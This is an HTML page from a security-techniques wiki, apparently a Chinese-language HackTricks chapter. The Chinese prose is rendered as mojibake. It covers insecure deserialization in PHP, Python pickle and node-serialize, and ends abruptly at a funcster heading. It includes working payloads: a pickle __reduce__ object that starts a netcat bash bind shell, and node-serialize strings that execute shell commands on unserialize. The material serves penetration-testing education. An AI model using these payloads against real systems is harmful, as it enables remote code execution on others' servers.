<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Deserialization</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="deserialization"><a class="header" href="#deserialization">Deserialization</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="åŸºæœ¬ä¿¡æ¯"><a class="header" href="#åŸºæœ¬ä¿¡æ¯">åŸºæœ¬ä¿¡æ¯</a></h2>
<p><strong>åºåˆ—åŒ–</strong> è¢«ç†è§£ä¸ºå°†å¯¹è±¡è½¬æ¢ä¸ºå¯ä»¥ä¿å­˜çš„æ ¼å¼çš„æ–¹æ³•ï¼Œç›®çš„æ˜¯å­˜å‚¨å¯¹è±¡æˆ–å°†å…¶ä½œä¸ºé€šä¿¡è¿‡ç¨‹çš„ä¸€éƒ¨åˆ†è¿›è¡Œä¼ è¾“ã€‚è¿™ç§æŠ€æœ¯é€šå¸¸ç”¨äºç¡®ä¿å¯¹è±¡å¯ä»¥åœ¨ç¨åæ—¶é—´é‡æ–°åˆ›å»ºï¼Œä¿æŒå…¶ç»“æ„å’ŒçŠ¶æ€ã€‚</p>
<p><strong>ååºåˆ—åŒ–</strong> åˆ™æ˜¯æŠµæ¶ˆåºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚å®ƒæ¶‰åŠå°†ä»¥ç‰¹å®šæ ¼å¼ç»“æ„åŒ–çš„æ•°æ®é‡æ–°æ„å»ºä¸ºå¯¹è±¡ã€‚</p>
<p>ååºåˆ—åŒ–å¯èƒ½æ˜¯å±é™©çš„ï¼Œå› ä¸ºå®ƒå¯èƒ½ <strong>å…è®¸æ”»å‡»è€…æ“çºµåºåˆ—åŒ–æ•°æ®ä»¥æ‰§è¡Œæœ‰å®³ä»£ç </strong> æˆ–åœ¨å¯¹è±¡é‡å»ºè¿‡ç¨‹ä¸­å¯¼è‡´åº”ç”¨ç¨‹åºå‡ºç°æ„å¤–è¡Œä¸ºã€‚</p>
<h2 id="php"><a class="header" href="#php">PHP</a></h2>
<p>åœ¨ PHP ä¸­ï¼Œç‰¹å®šçš„é­”æœ¯æ–¹æ³•åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­è¢«ä½¿ç”¨ï¼š</p>
<ul>
<li><code>__sleep</code>ï¼šåœ¨å¯¹è±¡è¢«åºåˆ—åŒ–æ—¶è°ƒç”¨ã€‚æ­¤æ–¹æ³•åº”è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å¯¹è±¡å±æ€§çš„åç§°ã€‚å®ƒé€šå¸¸ç”¨äºæäº¤å¾…å¤„ç†çš„æ•°æ®æˆ–æ‰§è¡Œç±»ä¼¼çš„æ¸…ç†ä»»åŠ¡ã€‚</li>
<li><code>__wakeup</code>ï¼šåœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶è°ƒç”¨ã€‚å®ƒç”¨äºé‡æ–°å»ºç«‹åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯èƒ½ä¸¢å¤±çš„ä»»ä½•æ•°æ®åº“è¿æ¥ï¼Œå¹¶æ‰§è¡Œå…¶ä»–é‡æ–°åˆå§‹åŒ–ä»»åŠ¡ã€‚</li>
<li><code>__unserialize</code>ï¼šåœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶è°ƒç”¨æ­¤æ–¹æ³•ï¼Œè€Œä¸æ˜¯ <code>__wakeup</code>ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚ä¸ <code>__wakeup</code> ç›¸æ¯”ï¼Œå®ƒå¯¹ååºåˆ—åŒ–è¿‡ç¨‹æä¾›äº†æ›´å¤šæ§åˆ¶ã€‚</li>
<li><code>__destruct</code>ï¼šåœ¨å¯¹è±¡å³å°†è¢«é”€æ¯æˆ–è„šæœ¬ç»“æŸæ—¶è°ƒç”¨æ­¤æ–¹æ³•ã€‚å®ƒé€šå¸¸ç”¨äºæ¸…ç†ä»»åŠ¡ï¼Œå¦‚å…³é—­æ–‡ä»¶å¥æŸ„æˆ–æ•°æ®åº“è¿æ¥ã€‚</li>
<li><code>__toString</code>ï¼šæ­¤æ–¹æ³•å…è®¸å°†å¯¹è±¡è§†ä¸ºå­—ç¬¦ä¸²ã€‚å®ƒå¯ä»¥ç”¨äºè¯»å–æ–‡ä»¶æˆ–å…¶ä»–åŸºäºå…¶ä¸­å‡½æ•°è°ƒç”¨çš„ä»»åŠ¡ï¼Œæœ‰æ•ˆåœ°æä¾›å¯¹è±¡çš„æ–‡æœ¬è¡¨ç¤ºã€‚</li>
</ul>
<pre><code class="language-php">&lt;?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this-&gt;s.'&lt;br /&gt;';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o-&gt;displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser-&gt;displaystring();

/*
php &gt; $o = new test();
__construct method called
__destruct method called
php &gt; $o-&gt;displaystring();
This is a test&lt;br /&gt;

php &gt; $ser=serialize($o);
__sleep method called

php &gt; echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php &gt; $unser=unserialize($ser);
__wakeup method called
__destruct method called

php &gt; $unser-&gt;displaystring();
This is a test&lt;br /&gt;
*/
?&gt;
</code></pre>
<p>å¦‚æœä½ æŸ¥çœ‹ç»“æœï¼Œä½ ä¼šå‘ç°å½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œ<strong><code>__wakeup</code></strong> å’Œ <strong><code>__destruct</code></strong> å‡½æ•°è¢«è°ƒç”¨ã€‚è¯·æ³¨æ„ï¼Œåœ¨ä¸€äº›æ•™ç¨‹ä¸­ï¼Œä½ ä¼šå‘ç°å½“å°è¯•æ‰“å°æŸä¸ªå±æ€§æ—¶ï¼Œ<strong><code>__toString</code></strong> å‡½æ•°è¢«è°ƒç”¨ï¼Œä½†æ˜¾ç„¶è¿™<strong>ä¸å†å‘ç”Ÿ</strong>ã€‚</p>
<p>{% hint style="warning" %}
å¦‚æœåœ¨ç±»ä¸­å®ç°äº†æ–¹æ³• <strong><code>__unserialize(array $data)</code></strong>ï¼Œåˆ™ä¼š<strong>è°ƒç”¨è¯¥æ–¹æ³•è€Œä¸æ˜¯ <code>__wakeup()</code></strong>ã€‚å®ƒå…è®¸ä½ é€šè¿‡æä¾›åºåˆ—åŒ–æ•°æ®ä½œä¸ºæ•°ç»„æ¥ååºåˆ—åŒ–å¯¹è±¡ã€‚ä½ å¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•æ¥ååºåˆ—åŒ–å±æ€§å¹¶åœ¨ååºåˆ—åŒ–æ—¶æ‰§è¡Œä»»ä½•å¿…è¦çš„ä»»åŠ¡ã€‚</p>
<pre><code class="language-php">class MyClass {
private $property;

public function __unserialize(array $data): void {
$this-&gt;property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
</code></pre>
<p>{% endhint %}</p>
<p>æ‚¨å¯ä»¥åœ¨è¿™é‡Œé˜…è¯»ä¸€ä¸ªè§£é‡Šè¿‡çš„ <strong>PHP ç¤ºä¾‹</strong>: <a href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/">https://www.notsosecure.com/remote-code-execution-via-php-unserialize/</a>ï¼Œåœ¨è¿™é‡Œ <a href="https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf">https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf</a> æˆ–åœ¨è¿™é‡Œ <a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/">https://securitycafe.ro/2015/01/05/understanding-php-object-injection/</a></p>
<h3 id="php-ååºåˆ—åŒ–--è‡ªåŠ¨åŠ è½½ç±»"><a class="header" href="#php-ååºåˆ—åŒ–--è‡ªåŠ¨åŠ è½½ç±»">PHP ååºåˆ—åŒ– + è‡ªåŠ¨åŠ è½½ç±»</a></h3>
<p>æ‚¨å¯ä»¥æ»¥ç”¨ PHP è‡ªåŠ¨åŠ è½½åŠŸèƒ½æ¥åŠ è½½ä»»æ„ php æ–‡ä»¶ç­‰:</p>
<p>{% content-ref url="php-deserialization-+-autoload-classes.md" %}
<a href="php-deserialization-+-autoload-classes.html">php-deserialization-+-autoload-classes.md</a>
{% endcontent-ref %}</p>
<h3 id="åºåˆ—åŒ–å¼•ç”¨å€¼"><a class="header" href="#åºåˆ—åŒ–å¼•ç”¨å€¼">åºåˆ—åŒ–å¼•ç”¨å€¼</a></h3>
<p>å¦‚æœå‡ºäºæŸç§åŸå› æ‚¨æƒ³å°†ä¸€ä¸ªå€¼åºåˆ—åŒ–ä¸º <strong>å¯¹å¦ä¸€ä¸ªåºåˆ—åŒ–å€¼çš„å¼•ç”¨</strong>ï¼Œæ‚¨å¯ä»¥:</p>
<pre><code class="language-php">&lt;?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o-&gt;param1 =&amp; $o-&gt;param22;
$o-&gt;param = "PARAM";
$ser=serialize($o);
</code></pre>
<h3 id="phpggc-ysoserial-for-php"><a class="header" href="#phpggc-ysoserial-for-php">PHPGGC (ysoserial for PHP)</a></h3>
<p><a href="https://github.com/ambionics/phpggc"><strong>PHPGGC</strong></a> å¯ä»¥å¸®åŠ©ä½ ç”Ÿæˆæœ‰æ•ˆè½½è·ä»¥æ»¥ç”¨ PHP ååºåˆ—åŒ–ã€‚<br />
è¯·æ³¨æ„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä½  <strong>æ— æ³•åœ¨åº”ç”¨ç¨‹åºçš„æºä»£ç ä¸­æ‰¾åˆ°æ»¥ç”¨ååºåˆ—åŒ–çš„æ–¹æ³•</strong>ï¼Œä½†ä½ å¯èƒ½èƒ½å¤Ÿ <strong>æ»¥ç”¨å¤–éƒ¨ PHP æ‰©å±•çš„ä»£ç ã€‚</strong><br />
å› æ­¤ï¼Œå¦‚æœå¯ä»¥ï¼Œè¯·æ£€æŸ¥æœåŠ¡å™¨çš„ <code>phpinfo()</code> å¹¶ <strong>åœ¨äº’è”ç½‘ä¸Šæœç´¢</strong>ï¼ˆç”šè‡³åœ¨ <strong>PHPGGC</strong> çš„ <strong>gadgets</strong> ä¸­ï¼‰ä¸€äº›å¯èƒ½çš„ gadget ä½ å¯ä»¥æ»¥ç”¨ã€‚</p>
<h3 id="phar-metadata-deserialization"><a class="header" href="#phar-metadata-deserialization">phar:// metadata deserialization</a></h3>
<p>å¦‚æœä½ å‘ç°ä¸€ä¸ª LFI åªæ˜¯è¯»å–æ–‡ä»¶è€Œä¸æ‰§è¡Œå…¶ä¸­çš„ php ä»£ç ï¼Œä¾‹å¦‚ä½¿ç”¨ <em><strong>file_get_contents(), fopen(), file() æˆ– file_exists(), md5_file(), filemtime() æˆ– filesize()</strong></em><strong>ã€‚</strong> ä½ å¯ä»¥å°è¯•æ»¥ç”¨åœ¨ä½¿ç”¨ <strong>phar</strong> åè®®æ—¶ <strong>è¯»å–</strong> <strong>æ–‡ä»¶</strong> å‘ç”Ÿçš„ <strong>ååºåˆ—åŒ–</strong>ã€‚<br />
æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·é˜…è¯»ä»¥ä¸‹å¸–å­ï¼š</p>
<p>{% content-ref url="../file-inclusion/phar-deserialization.md" %}
<a href="../file-inclusion/phar-deserialization.html">phar-deserialization.md</a>
{% endcontent-ref %}</p>
<h2 id="python"><a class="header" href="#python">Python</a></h2>
<h3 id="pickle"><a class="header" href="#pickle"><strong>Pickle</strong></a></h3>
<p>å½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œå‡½æ•° <em>__reduce__</em> å°†è¢«æ‰§è¡Œã€‚<br />
å½“è¢«åˆ©ç”¨æ—¶ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯ã€‚</p>
<pre><code class="language-python">import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
</code></pre>
<p>åœ¨æ£€æŸ¥ç»•è¿‡æŠ€æœ¯ä¹‹å‰ï¼Œå¦‚æœæ‚¨æ­£åœ¨è¿è¡Œ python3ï¼Œè¯·å°è¯•ä½¿ç”¨ <code>print(base64.b64encode(pickle.dumps(P(),2)))</code> ç”Ÿæˆä¸ python2 å…¼å®¹çš„å¯¹è±¡ã€‚</p>
<p>æœ‰å…³é€ƒç¦» <strong>pickle jails</strong> çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š</p>
<p>{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
<a href="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/">bypass-python-sandboxes</a>
{% endcontent-ref %}</p>
<h3 id="yaml--jsonpickle"><a class="header" href="#yaml--jsonpickle">Yaml <strong>&amp;</strong> jsonpickle</a></h3>
<p>ä»¥ä¸‹é¡µé¢ä»‹ç»äº† <strong>æ»¥ç”¨ä¸å®‰å…¨çš„ yaml ååºåˆ—åŒ–</strong> çš„æŠ€æœ¯ï¼Œå¹¶ä»¥ä¸€ä¸ªå¯ä»¥ç”¨äºç”Ÿæˆ <strong>Pickle, PyYAML, jsonpickle å’Œ ruamel.yaml</strong> çš„ RCE ååºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½çš„å·¥å…·ç»“æŸï¼š</p>
<p>{% content-ref url="python-yaml-deserialization.md" %}
<a href="python-yaml-deserialization.html">python-yaml-deserialization.md</a>
{% endcontent-ref %}</p>
<h3 id="ç±»æ±¡æŸ“-python-åŸå‹æ±¡æŸ“"><a class="header" href="#ç±»æ±¡æŸ“-python-åŸå‹æ±¡æŸ“">ç±»æ±¡æŸ“ (Python åŸå‹æ±¡æŸ“)</a></h3>
<p>{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
<a href="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.html">class-pollution-pythons-prototype-pollution.md</a>
{% endcontent-ref %}</p>
<h2 id="nodejs"><a class="header" href="#nodejs">NodeJS</a></h2>
<h3 id="js-é­”æ³•å‡½æ•°"><a class="header" href="#js-é­”æ³•å‡½æ•°">JS é­”æ³•å‡½æ•°</a></h3>
<p>JS <strong>æ²¡æœ‰åƒ PHP æˆ– Python é‚£æ ·çš„ "é­”æ³•" å‡½æ•°</strong>ï¼Œè¿™äº›å‡½æ•°ä»…ç”¨äºåˆ›å»ºå¯¹è±¡è€Œè¢«æ‰§è¡Œã€‚ä½†å®ƒæœ‰ä¸€äº› <strong>å‡½æ•°</strong>ï¼Œå³ä½¿æ²¡æœ‰ç›´æ¥è°ƒç”¨å®ƒä»¬ä¹Ÿ <strong>ç»å¸¸ä½¿ç”¨</strong>ï¼Œä¾‹å¦‚ <strong><code>toString</code></strong>ã€<strong><code>valueOf</code></strong>ã€<strong><code>toJSON</code></strong>ã€‚<br />
å¦‚æœæ»¥ç”¨ååºåˆ—åŒ–ï¼Œæ‚¨å¯ä»¥ <strong>å¦¥åè¿™äº›å‡½æ•°ä»¥æ‰§è¡Œå…¶ä»–ä»£ç </strong>ï¼ˆå¯èƒ½æ»¥ç”¨åŸå‹æ±¡æŸ“ï¼‰ï¼Œå½“å®ƒä»¬è¢«è°ƒç”¨æ—¶ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<p>å¦ä¸€ç§ <strong>"é­”æ³•" è°ƒç”¨å‡½æ•°</strong> çš„æ–¹å¼æ˜¯é€šè¿‡ <strong>å¦¥åä¸€ä¸ªç”±å¼‚æ­¥å‡½æ•°</strong>ï¼ˆpromiseï¼‰<strong>è¿”å›çš„å¯¹è±¡</strong>ã€‚å› ä¸ºï¼Œå¦‚æœæ‚¨ <strong>å°†</strong>è¯¥ <strong>è¿”å›å¯¹è±¡</strong> è½¬æ¢ä¸ºå¦ä¸€ä¸ª <strong>promise</strong>ï¼Œå¹¶å…·æœ‰ä¸€ä¸ªåä¸º <strong>"then" çš„å‡½æ•°ç±»å‹å±æ€§</strong>ï¼Œå®ƒå°†ä»…å› ä¸ºå®ƒæ˜¯ç”±å¦ä¸€ä¸ª promise è¿”å›è€Œè¢« <strong>æ‰§è¡Œ</strong>ã€‚<em>æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·</em> <a href="https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/"><em><strong>ç‚¹å‡»æ­¤é“¾æ¥</strong></em></a> <em>ã€‚</em></p>
<pre><code class="language-javascript">// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve =&gt; {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then =&gt; {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
</code></pre>
<h3 id="__proto__-å’Œ-prototype-æ±¡æŸ“"><a class="header" href="#__proto__-å’Œ-prototype-æ±¡æŸ“"><code>__proto__</code> å’Œ <code>prototype</code> æ±¡æŸ“</a></h3>
<p>å¦‚æœä½ æƒ³äº†è§£è¿™ä¸ªæŠ€æœ¯ <strong>è¯·æŸ¥çœ‹ä»¥ä¸‹æ•™ç¨‹</strong>ï¼š</p>
<p>{% content-ref url="nodejs-proto-prototype-pollution/" %}
<a href="nodejs-proto-prototype-pollution/">nodejs-proto-prototype-pollution</a>
{% endcontent-ref %}</p>
<h3 id="node-serialize"><a class="header" href="#node-serialize"><a href="https://www.npmjs.com/package/node-serialize">node-serialize</a></a></h3>
<p>è¿™ä¸ªåº“å…è®¸åºåˆ—åŒ–å‡½æ•°ã€‚ç¤ºä¾‹ï¼š</p>
<pre><code class="language-javascript">var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
</code></pre>
<p>è¯¥ <strong>åºåˆ—åŒ–å¯¹è±¡</strong> çœ‹èµ·æ¥åƒï¼š</p>
<pre><code class="language-bash">{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
</code></pre>
<p>æ‚¨å¯ä»¥åœ¨ç¤ºä¾‹ä¸­çœ‹åˆ°ï¼Œå½“ä¸€ä¸ªå‡½æ•°è¢«åºåˆ—åŒ–æ—¶ï¼Œ<code>_$$ND_FUNC$$_</code> æ ‡å¿—ä¼šé™„åŠ åˆ°åºåˆ—åŒ–å¯¹è±¡ä¸Šã€‚</p>
<p>åœ¨æ–‡ä»¶ <code>node-serialize/lib/serialize.js</code> ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ç›¸åŒçš„æ ‡å¿—ä»¥åŠä»£ç æ˜¯å¦‚ä½•ä½¿ç”¨å®ƒçš„ã€‚</p>
<p><img src="../../.gitbook/assets/image%20(351).png" alt="" /></p>
<p><img src="../../.gitbook/assets/image%20(446).png" alt="" /></p>
<p>æ­£å¦‚æ‚¨åœ¨æœ€åä¸€æ®µä»£ç ä¸­çœ‹åˆ°çš„ï¼Œ<strong>å¦‚æœæ‰¾åˆ°è¯¥æ ‡å¿—</strong>ï¼Œåˆ™ä½¿ç”¨ <code>eval</code> æ¥ååºåˆ—åŒ–å‡½æ•°ï¼Œå› æ­¤åŸºæœ¬ä¸Š<strong>ç”¨æˆ·è¾“å…¥è¢«ç”¨äº <code>eval</code> å‡½æ•°ä¸­</strong>ã€‚</p>
<p>ç„¶è€Œï¼Œ<strong>ä»…ä»…åºåˆ—åŒ–</strong>ä¸€ä¸ªå‡½æ•°<strong>å¹¶ä¸ä¼šæ‰§è¡Œå®ƒ</strong>ï¼Œå› ä¸ºåœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­éœ€è¦æŸéƒ¨åˆ†ä»£ç <strong>è°ƒç”¨ <code>y.rce</code></strong>ï¼Œè¿™éå¸¸<strong>ä¸å¯èƒ½</strong>ã€‚<br />
æ— è®ºå¦‚ä½•ï¼Œæ‚¨å¯ä»¥<strong>ä¿®æ”¹åºåˆ—åŒ–å¯¹è±¡</strong>ï¼Œ<strong>æ·»åŠ ä¸€äº›æ‹¬å·</strong>ï¼Œä»¥ä¾¿åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶è‡ªåŠ¨æ‰§è¡Œåºåˆ—åŒ–çš„å‡½æ•°ã€‚<br />
åœ¨ä¸‹ä¸€æ®µä»£ç ä¸­<strong>æ³¨æ„æœ€åçš„æ‹¬å·</strong>ä»¥åŠ <code>unserialize</code> å‡½æ•°å°†å¦‚ä½•è‡ªåŠ¨æ‰§è¡Œä»£ç ï¼š</p>
<pre><code class="language-javascript">var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
</code></pre>
<p>å¦‚å‰æ‰€è¿°ï¼Œè¯¥åº“å°†åœ¨<code>_$$ND_FUNC$$_</code>ä¹‹åè·å–ä»£ç å¹¶å°†<strong>æ‰§è¡Œå®ƒ</strong>ï¼Œä½¿ç”¨<code>eval</code>ã€‚å› æ­¤ï¼Œä¸ºäº†<strong>è‡ªåŠ¨æ‰§è¡Œä»£ç </strong>ï¼Œæ‚¨å¯ä»¥<strong>åˆ é™¤å‡½æ•°åˆ›å»º</strong>éƒ¨åˆ†å’Œæœ€åä¸€ä¸ªæ‹¬å·ï¼Œå¹¶<strong>ä»…æ‰§è¡Œä¸€ä¸ª JS å•è¡Œä»£ç </strong>ï¼Œå¦‚ä¸‹ä¾‹æ‰€ç¤ºï¼š</p>
<pre><code class="language-javascript">var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
</code></pre>
<p>æ‚¨å¯ä»¥<a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/"><strong>åœ¨è¿™é‡Œæ‰¾åˆ°</strong></a> <strong>æ›´å¤šä¿¡æ¯</strong>ï¼Œå…³äºå¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´ã€‚</p>
<h3 id="funcster"><a class="header" href="#funcster"><a href="https://www.npmjs.com/package/funcster">funcster</a></a></h3>
